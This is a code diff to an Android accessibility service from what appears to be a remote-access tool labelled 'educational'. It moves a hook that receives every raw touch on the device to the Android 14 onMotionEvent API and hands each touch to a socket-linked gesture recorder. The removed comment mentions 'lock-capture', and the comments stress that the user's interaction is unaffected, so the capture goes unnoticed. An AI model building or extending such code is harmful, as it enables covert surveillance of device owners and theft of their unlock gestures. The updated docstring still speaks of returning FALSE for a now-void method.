@@ -13,6 +13,7 @@ import android.accessibilityservice.GestureDescription;
 import android.graphics.Path;
 import android.graphics.Point;
 import android.view.Display;
+import android.view.MotionEvent;
 import android.view.WindowManager;
 import android.os.Handler;
 import android.os.Looper;
@@ -153,22 +154,23 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     /**
-     * Receives every raw touch event on the device when
-     * FLAG_REQUEST_TOUCH_EXPLORATION_MODE is set in the service info.
+     * Called by the framework on Android 14+ (API 34) for every raw touch event on the
+     * device when FLAG_REQUEST_TOUCH_EXPLORATION_MODE is set in the service info.
      *
-     * We forward the event to GestureRecorder (which only records when auto-capture
-     * or lock-capture is active) and return FALSE so the system passes the touch
-     * through to whatever is on screen — the user's interaction is completely unaffected.
+     * We forward the event to GestureRecorder (records only when capture is active)
+     * and return FALSE so the system passes the touch through unchanged —
+     * the user's interaction is never blocked or altered.
      */
+    @RequiresApi(api = Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
     @Override
-    public boolean onTouchEvent(MotionEvent event) {
+    public void onMotionEvent(MotionEvent event) {
         try {
             com.remoteaccess.educational.commands.GestureRecorder gr =
                     com.remoteaccess.educational.network.SocketManager
                             .getInstance(this).getGestureRecorder();
             if (gr != null) gr.handleServiceTouchEvent(event);
         } catch (Exception ignored) {}
-        return false; // pass the event through — do NOT consume it
+        // Not consuming — the framework still delivers the event to the foreground app.
     }
 
     private void ensureRemoteServiceRunning() {
